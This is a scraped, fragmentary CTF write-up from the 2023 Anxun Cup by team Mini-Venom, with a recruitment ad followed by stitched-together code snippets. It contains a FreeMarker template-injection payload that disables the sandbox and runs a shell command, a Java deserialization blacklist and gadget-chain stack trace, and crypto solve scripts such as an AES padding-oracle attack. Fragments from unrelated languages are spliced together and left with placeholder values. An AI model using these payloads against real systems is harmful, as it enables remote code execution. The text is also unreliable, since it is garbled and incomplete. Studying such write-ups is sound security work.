# 2023安洵杯 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/153097.html
> ID: 153097

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组


```
static {
    BLACKLIST.add("com.sun.jndi");
    BLACKLIST.add("com.fasterxml.jackson");
    BLACKLIST.add("org.springframework");
    BLACKLIST.add("com.sun.rowset.JdbcRowSetImpl");
    BLACKLIST.add("java.security.SignedObject");
    BLACKLIST.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    BLACKLIST.add("java.lang.Runtime");
    BLACKLIST.add("java.lang.ProcessBuilder");
    BLACKLIST.add("java.util.PriorityQueue");
}
public Connection getConnection(@Nullable String user, @Nullable String password)
    throws SQLException {
  try {
    Connection con = DriverManager.getConnection(getUrl(), user, password);
    if (LOGGER.isLoggable(Level.FINE)) {
      LOGGER.log(Level.FINE, "Created a {0} for {1} at {2}",
          new Object[] {getDescription(), user, getUrl()});
    }
    return con;
  } catch (SQLException e) {
    LOGGER.log(Level.FINE, "Failed to create a {0} for {1} at {2}: {3}",
        new Object[] {getDescription(), user, getUrl(), e});
    throw e;
  }
}
PGConnectionPoolDataSource pgPoolingDataSource = new PGConnectionPoolDataSource();
getUrl:
1239, BaseDataSource (org.postgresql.ds.common)
getConnection:
111, BaseDataSource (org.postgresql.ds.common)
getConnection:87, BaseDataSource (org.postgresql.ds.common)
getPooledConnection:58, PGConnectionPoolDataSource (org.postgresql.ds)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:
498, Method (java.lang.reflect)
invokeMethod:
2116, PropertyUtilsBean (org.apache.commons.beanutils)
getSimpleProperty:
1267, PropertyUtilsBean (org.apache.commons.beanutils)
getNestedProperty:
808, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:
884, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:
464, PropertyUtils (org.apache.commons.beanutils)
compare:
163, BeanComparator (org.apache.commons.beanutils)
compare:
1295, TreeMap (java.util)
put:
538, TreeMap (java.util)
get:
152, LazyMap (org.apache.commons.collections.map)
getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
toString:
131, TiedMapEntry (org.apache.commons.collections.keyvalue)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:
498, Method (java.lang.reflect)
invokeReadObject:
1185, ObjectStreamClass (java.io)
readSerialData:
2345, ObjectInputStream (java.io)
readOrdinaryObject:
2236, ObjectInputStream (java.io)
readObject0:
1692, ObjectInputStream (java.io)
readObject:
508, ObjectInputStream (java.io)
readObject:
466, ObjectInputStream (java.io)
main:58, ezJava (gadget.timu)
spring.freemarker.expose-spring-macro-helpers=true
Spring Beans可用，可以直接禁用沙箱。拿这个写index.ftl访问模板即可。
Java
<#assign ac=springMacroRequestContext.webApplicationContext>
  <#assign fc=ac.getBean('freeMarkerConfiguration')>
    <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
      <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${"freemarker.template.utility.Execute"?new()("id")}
package gadget.timu;
<?php
//error_reporting(0);
class Good{
    public $g1;
    private $gg2;
    #coding=gbk
import json
from flask import Flask, request,  jsonify,send_file,render_template_string
import jwt
import requests
from functools import wraps
from datetime import datetime
import os
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//
import hashlib
import string
from itertools import product
p1 = list(p[:
1024])
        p2 = list(p[1024:])
        p1[random.choice([i for i, c in enumerate(p1) if c == '1'])] = '0'
        p2[random.choice([i for i, c in enumerate(p1) if c == '0'])] = '1'
from Crypto.Util.number import *
from gmpy2 import gcd
from tqdm import tqdm
n = xx
p = 0bxx
c = xx
p = bin(p)[2:]
for i in tqdm(range(1024)):
    for j in range(1024, 2048):
        if p[j] == '1' and p[i] == '0' and p[j-1024] == '0':
            q = int(p, 2) + pow(2, len(p)-i-1)
            q0 = q - pow(2, len(p)-j-1)
            if gcd(n, q) == q:
                d = inverse(e, q-1)
            elif gcd(q0,n) == q0:
                d = inverse(e, q0-1)
                q = q0
            else :
                continue
            flag = long_to_bytes(int(pow(c, d, q)))
            if b'D0g3{' in flag:
                print(flag)
                break
import hashlib
import string
from itertools import product
sh.recvuntil(b'Welcome to AES System, please choose the following options:n1. encrypt the flagn2. decrypt the flagn')
sh.sendline(b'1')
sh.recvuntil(b'This is your flag: ')
Cipher = sh.recvuntil(b'n')[:-1]
def asserts(pt: bytes):
    num = pt[-1]
    if len(pt) == 16:
        result = pt[::-1]
        count = 0
        for i in result:
            if i == num:
                count += 1
            else:
                break
        if count == num:
            return True
        else:
            return False
    else:
        return False
m_known = b'}'
for i in tqdm(range(6,15)):
    for j in range(32,128):
        i_known = (i<<24) + (i<<16) + (i<<8) + i
        num = len(m_known)
        K = bytes_to_long(m_known[::-1])^bytes_to_long(IV[-4-num:-4])^bytes_to_long(long_to_bytes(i)*num)
        k1 = long_to_bytes(IV[-i] ^ j ^ i)
        k2 = long_to_bytes(bytes_to_long(IV[-4:]) ^ bytes_to_long(b'x04' * 4) ^ i_known)
        iv = IV[:16-i] + k1 + k2
        sh.sendline(b'2')
        sh.recvuntil(b'Please enter ciphertext:n')
        sh.sendline(f'{cipher}'.encode())
        Asser = sh.recvuntil(b'n')[:-1]
        if Asser == b'True':
            m_known += long_to_bytes(j)
            break
    print(m_known[::-1])
# D0g3{0P@d4Ttk}
import hashlib
import string
from itertools import product
while True:
    r = r * x
    if r.bit_length() > 1024 and isPrime(r - 1):
        r = r - 1
        break
for i in range(x - (2**2 - 1)):
    a += pow(e1, i)
for j in range(3):
    b += pow(e2, j)
x = var('x')
f = inv_p * x ** 2 + (2 * inv_q * inv_p - 1 - p_q) * x + inv_q * (inv_p * inv_q - 1)
X = f.roots()
k1 = X[1]
p = inv_q + k1
q = p_q//p
m11 = pow(c1,(p+1)//4,p)
m12 = pow(c1,(q+1)//4,q)
m13 = pow(c1,(r+1)//4,r)
phi = (p-1)*(q-1)*(r-1)
d2 = gmpy2.invert(e2,phi)
m = gmpy2.powmod(c2,int(d2),n)
print(long_to_bytes(m))
go+kotlin
position_map = {
    0: 26, 1: 17, 2: 21, 3: 31, 4: 36, 5: 15, 6: 27, 7: 19, 8: 24, 9: 6,
    10: 10, 11: 2, 12: 12, 13: 35, 14: 4, 15: 9, 16: 16, 17: 37, 18: 18, 19: 7,
    20: 20, 21: 0, 22: 23, 23: 22, 24: 13, 25: 14, 26: 25, 27: 30, 28: 11, 29: 3,
    30: 8, 31: 29, 32: 32, 33: 33, 34: 1, 35: 34, 36: 28, 37: 5
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1703464173.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1703464174.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1703464174.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1703464175.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1703464176.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/5-1703464176.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1703464177.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1703464177.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1703464178.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1703464178.png)